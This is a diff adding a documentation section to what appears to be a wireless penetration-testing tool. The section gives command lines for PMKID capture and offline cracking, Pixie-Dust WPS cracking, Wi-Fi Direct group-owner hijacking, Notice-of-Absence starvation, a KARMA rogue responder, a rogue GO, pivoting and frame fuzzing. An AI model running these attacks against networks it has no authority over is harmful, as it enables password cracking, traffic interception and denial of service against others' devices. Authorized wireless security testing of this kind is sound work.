@@ -309,7 +309,133 @@ jq -s '{findings: (map(.findings) | add)}' pixie.json wps.json hs.json > all.jso
 sudo python3 scan.py novelty-check --input all.json --output triaged.json
 ```
 
-## 16. Common failures
+## 16. New modules (batch 2 and 3)
+
+### PMKID capture and offline crack
+
+```
+sudo python3 scan.py pmkid -i wlan0 --go aa:bb:cc:dd:ee:ff \
+     --channel 6 --attempts 5 --authorized \
+     --output pmkid.json
+python3 scan.py hashcat --pcap evidence/pmkid_aabbccddeeff.pcap \
+     --wordlist /usr/share/wordlists/rockyou.txt --runtime 300
+```
+
+### Native Pixie-Dust from an existing pcap
+
+Use when reaver's live path is unreliable. Requires a pcap containing
+the WPS M1, M2, and M3 messages from a prior capture.
+
+```
+sudo python3 scan.py pixie-pcap --pcap evidence/wsc_capture.pcap
+```
+
+### P2P Invitation rejoin
+
+Re-invite a target that participated in a persistent group. Recover
+`--group-bssid` and `--group-ssid` from a prior successful join.
+
+```
+sudo python3 scan.py invitation -i wlan0 \
+     --target aa:bb:cc:dd:ee:ff \
+     --group-bssid 02:aa:bb:cc:dd:00 --group-ssid 'DIRECT-XX-Persistent' \
+     --channel 6 --authorized --output inv.json
+```
+
+### GO Negotiation hijack
+
+Listen for a GO-Neg-Req to our MAC and race a GO-Neg-Resp with
+intent=15 + tiebreaker=1. Target ends up as a Client of our future GO.
+
+```
+sudo python3 scan.py goneg-hijack -i wlan0 \
+     --our-mac 02:11:22:33:44:55 --channel 6 --timeout 30 --authorized
+```
+
+### Notice-of-Absence starvation
+
+Impersonate the target GO's beacon with continuous NoA descriptor;
+compliant clients silence themselves.
+
+```
+sudo python3 scan.py noa-starve -i wlan0 \
+     --go aa:bb:cc:dd:ee:ff --ssid 'DIRECT-XX-TV' \
+     --channel 6 --duration 60 --authorized
+```
+
+### Cross-connection pivot
+
+Run after joining the P2P group as a Client. Discovers the P2P subnet
+gateway and probes TCP reachability for pivot targets.
+
+```
+sudo python3 scan.py cross-conn -i p2p-wlan0-0 \
+     --pivot-target 192.168.1.1 --manageability 0x00
+```
+
+### Driver capability probe
+
+```
+sudo python3 scan.py driver-probe -i wlan0
+```
+
+Emits JSON with driver name, supported interface modes, PMF ciphers,
+and warnings for known-broken drivers.
+
+### KARMA probe-response responder
+
+Runs alongside the rogue-GO on a second interface, replying to any
+directed probe with the requested SSID paired with our BSSID.
+
+```
+sudo python3 scan.py karma -i wlan0 \
+     --our-bssid 02:aa:bb:cc:dd:ee --channel 6 --duration 300 \
+     --deny 'CorporateWiFi' --authorized
+```
+
+### Wi-Fi Aware / NAN scanner
+
+```
+sudo python3 scan.py nan-scan -i wlan0 --duration 60
+```
+
+### Miracast RTSP sink and fuzzer
+
+Stand up a Miracast responder to log source M4/M5 for inspection:
+
+```
+sudo python3 scan.py miracast-sink --host 0.0.0.0 --port 7236 \
+     --duration 300 --log-path evidence/miracast_sink.log
+```
+
+Fuzz a sink at 192.168.49.10:
+
+```
+python3 scan.py miracast-fuzz --sink 192.168.49.10 \
+     --cases 128 --seed 1 --authorized
+```
+
+### P2P Public Action frame fuzzer
+
+```
+sudo python3 scan.py p2p-fuzz -i wlan0 \
+     --target aa:bb:cc:dd:ee:ff --cases 500 --seed 0xC0FFEE \
+     --subtypes 7 0 3 --authorized
+```
+
+Emits `evidence/p2pfuzz_crash_s<subtype>_i<index>.bin` files whenever
+target liveness drops for three consecutive cases.
+
+### SAE-transition rogue GO
+
+```
+sudo python3 scan.py rogue-go -i wlan1 \
+     --ssid 'DIRECT-XX-Target' --bssid aa:bb:cc:dd:ee:ff \
+     --channel 6 --sae-transition \
+     --duration 300 --authorized
+```
+
+## 17. Common failures
 
 | Symptom                                    | Cause / fix                                       |
 |--------------------------------------------|---------------------------------------------------|
